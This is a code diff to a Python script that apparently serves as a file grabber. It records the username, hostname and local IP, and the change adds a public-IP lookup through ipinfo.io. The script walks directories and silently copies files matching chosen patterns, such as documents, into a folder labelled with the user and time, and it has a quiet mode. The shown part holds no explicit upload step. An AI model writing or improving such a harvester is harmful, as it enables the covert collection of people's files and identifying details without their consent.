@@ -11,6 +11,7 @@ import shutil
 import socket
 import subprocess
 import sys
+import requests
 from shutil import copyfile
 
 try:
@@ -26,6 +27,13 @@ try:
             user = getpass.getuser()
             hostname = socket.gethostname()
             lip = socket.gethostbyname(socket.gethostname())
+            try:
+                response = requests.get('https://ipinfo.io/json')
+                r = response.json()
+                rip = r['ip']
+            except:
+                rip = "error"
+                pass
             prefix = "{~}"
             timedate = prefix + " " + timedate
             dirname = user + "_" + time
@@ -46,17 +54,17 @@ try:
 
 {0}
 (
-		{1}
-		hostname: {2}
-		username: {3}
-		local ip: {4}
-	""".format(timedate, typeos, hostname, user, lip))
+	{1}
+	hostname: {2}
+	username: {3}
+	ip: {4}
+	local ip: {5}
+""".format(timedate, typeos, hostname, user, rip, lip))
 
 
             def find(pattern, path, pok):
                 global result
                 result = 0
-                duplicate = 0
                 for root, dirs, files in os.walk(path):
                     for name in files:
                         if fnmatch.fnmatch(name, pattern):
@@ -65,7 +73,7 @@ try:
                                 copyfile(fileg, dio + pok + name)
                                 result += 1
                             except shutil.SameFileError:
-                                duplicate += 1
+                                pass
 
 
             if "-q" not in str(sys.argv):
@@ -83,6 +91,7 @@ try:
                 print("	" + typeos)
                 print("	hostname: ", hostname)
                 print(" 	username: ", user)
+                print(" 	ip: ", rip)
                 print(" 	local ip: ", lip)
 
             if "all" in str(sys.argv) or "documents" in str(sys.argv):
